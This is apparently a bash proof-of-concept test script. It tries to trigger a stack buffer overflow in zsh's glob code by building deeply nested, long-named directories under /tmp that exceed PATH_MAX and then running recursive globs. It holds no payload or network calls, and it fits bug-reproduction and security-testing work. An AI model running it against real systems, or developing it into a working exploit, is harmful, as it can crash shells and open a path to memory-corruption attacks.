#!/bin/bash
# Attempt to trigger the statfullpath() stack buffer overflow in glob.c
# by creating a deeply nested directory structure with long names
# that causes the accumulated path to exceed PATH_MAX (4096).
set -euo pipefail

ZSH_BIN="${1:-$(command -v zsh 2>/dev/null || echo /bin/zsh)}"
WORK=/tmp/glob_overflow_test
trap 'rm -rf "$WORK"' EXIT
mkdir -p "$WORK"

# Strategy: create nested directories with names just under PATH_MAX/4 each
# so that 5+ levels deep, the total path exceeds PATH_MAX
LONG_NAME=$(python3 -c "print('A' * 200)")

# Build nested dirs
CUR="$WORK/base"
mkdir -p "$CUR"
for i in $(seq 1 25); do
    CUR="$CUR/$LONG_NAME$i"
    mkdir -p "$CUR" 2>/dev/null || break
    echo "depth $i: path length $(echo -n "$CUR" | wc -c)"
done

# Create a file at the deepest level
touch "$CUR/target" 2>/dev/null || echo "could not create target file (path too long for FS)"

echo
echo "=== Testing glob expansion with the deep directory structure ==="
echo "PATH_MAX on this system: $(getconf PATH_MAX /)"
echo

# Run zsh with a glob that traverses this structure
cd "$WORK/base"
echo "Running: echo $LONG_NAME*/**/*"
timeout 10 "$ZSH_BIN" -c "setopt GLOB_DOTS; echo ${LONG_NAME}*/**/*" 2>&1 || echo "EXIT CODE: $?"

echo
echo "=== Testing with even deeper nesting ==="
# Try with shorter names but more depth
WORK2="$WORK/base2"
mkdir -p "$WORK2"
CUR2="$WORK2"
for i in $(seq 1 100); do
    CUR2="$CUR2/d$(printf '%040d' $i)"
    mkdir -p "$CUR2" 2>/dev/null || { echo "mkdir failed at depth $i, path length $(echo -n "$CUR2" | wc -c)"; break; }
done
touch "$CUR2/target" 2>/dev/null || true

cd "$WORK/base2"
echo "Running glob on deep structure..."
timeout 10 "$ZSH_BIN" -c 'echo d*/**/*' 2>&1 || echo "EXIT CODE: $?"
